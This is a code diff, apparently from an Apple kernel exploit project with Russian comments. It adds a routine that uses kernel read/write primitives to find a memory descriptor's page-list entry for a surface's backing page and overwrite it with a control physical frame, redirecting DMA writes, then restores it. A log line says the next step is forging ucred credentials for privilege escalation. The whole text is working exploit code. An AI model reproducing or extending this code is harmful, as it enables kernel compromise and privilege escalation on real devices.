@@ -6594,6 +6594,54 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             }
         }
     }
+    // 1.9.211: RMD — детерминизм вместо лотереи DEP. Выигрыш 1.9.207 = отравление
+    // page-list записи ROOT-MD поверхности (голый pfn32 — авторитетный источник
+    // rewriter'а). Путь: [surf+0x30] plane sub-MD → [+0x60] родитель (root MD) →
+    // его указатели/массивы → запись == backingPA>>14 → ctlPFN. Без frame-type
+    // лотереи — прямо по цепочке объектов.
+    uint64_t rmdHitArr = 0, rmdHitOld = 0;
+    uint32_t rmdHitOff = 0;
+    {
+        uint64_t pd211 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        uint64_t rootMD = (kpLooksLikeKernelPointer(pd211) && kpSafeToRead(pd211)) ? kp_untag_ptr(early_kread64(pd211 + 0x60)) : 0;
+        kpNote(r, [NSString stringWithFormat:@"  [RMD] pd=%#llx rootMD=%#llx", (unsigned long long)pd211, (unsigned long long)rootMD]);
+        if (kpLooksLikeKernelPointer(rootMD) && kpSafeToRead(rootMD)) {
+            // пулы: поля rootMD (до 8 kernel-указателей) — каждый кандидат-массив
+            uint64_t pools211[10]; uint32_t psz211[10]; int np211 = 0;
+            pools211[np211] = rootMD; psz211[np211] = 0x200; np211++;   // inline-поля тоже (page-list может быть inline)
+            for (uint32_t o = 0; o + 8 <= 0x100 && np211 < 9; o += 8) {
+                uint64_t Q = kp_untag_ptr(early_kread64(rootMD + o));
+                if (!kpLooksLikeKernelPointer(Q) || !kpSafeToRead(Q)) continue;
+                BOOL dup = NO;
+                for (int j = 0; j < np211; j++) if (pools211[j] == Q) { dup = YES; break; }
+                if (dup) continue;
+                pools211[np211] = Q; psz211[np211] = 0x400; np211++;
+            }
+            for (int pi = 0; pi < np211 && !rmdHitArr; pi++) {
+                for (uint32_t o = 0; o + 8 <= psz211[pi] && !rmdHitArr; o += 8) {
+                    uint64_t q = early_kread64(pools211[pi] + o);
+                    int frm = 0;
+                    if (q == backingPA) frm = 1;
+                    else if (q == (uint64_t)pfn32) frm = 2;
+                    else if ((uint32_t)(q >> 32) == pfn32 && (q & 0xffffffffULL) == 1) frm = 3;
+                    else if ((uint32_t)q == pfn32 && (q >> 32) && (q >> 32) <= 0x10) frm = 4;
+                    if (!frm) continue;
+                    rmdHitArr = pools211[pi]; rmdHitOff = o; rmdHitOld = q;
+                    uint64_t nq = (frm == 1) ? ((q & 0x3fffULL) | ctlPA)
+                                : (frm == 2) ? (uint64_t)ctlPFN
+                                : (frm == 3) ? (((uint64_t)ctlPFN << 32) | (q & 0xffffffffULL))
+                                : ((q & 0xffffffff00000000ULL) | ctlPFN);
+                    kpNote(r, [NSString stringWithFormat:@"  [RMD] ★ page-list запись pool%d+%#x форма%d: %#018llx → %#018llx",
+                              pi, o, frm, (unsigned long long)q, (unsigned long long)nq]);
+                    usleep(2000);
+                    early_kwrite64(pools211[pi] + o, nq);
+                    uint64_t rbA = early_kread64(pools211[pi] + o);
+                    kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rbA, rbA == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                }
+            }
+            if (!rmdHitArr) kpNote(r, @"  [RMD] записи pfn в цепочке rootMD нет — дамп его полей для разбора");
+        }
+    }
     // 3. Trusted-path резолв surfVA через M2 async op-entry (1.9.124):
     //    async submit резолвит surface ptr в op-entry БЕЗ execute/снапшота
     //    (раунд 13: DVA-снапшот только при execute). Вся цепочка — из РЕАЛЬНЫХ
@@ -7006,6 +7054,13 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         uint64_t rb9 = early_kread64(ownHitArr + ownHitOff);
         kpNote(r, [NSString stringWithFormat:@"  [OWN] restore базы owner-MD: %#018llx — %@", (unsigned long long)rb9,
                   rb9 == ownHitOld ? @"вернули оригинал" : @"НЕ вернулось"]);
+    }
+    // 1.9.211: restore page-list root-MD
+    if (rmdHitArr) {
+        early_kwrite64(rmdHitArr + rmdHitOff, rmdHitOld);
+        uint64_t rb10 = early_kread64(rmdHitArr + rmdHitOff);
+        kpNote(r, [NSString stringWithFormat:@"  [RMD] restore page-list: %#018llx — %@", (unsigned long long)rb10,
+                  rb10 == rmdHitOld ? @"вернули оригинал" : @"НЕ вернулось"]);
     }
     if (changed) {
         kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (%u dword) — page-list swap до execute РАБОТАЕТ. Дальше форж ucred ===", changed]);
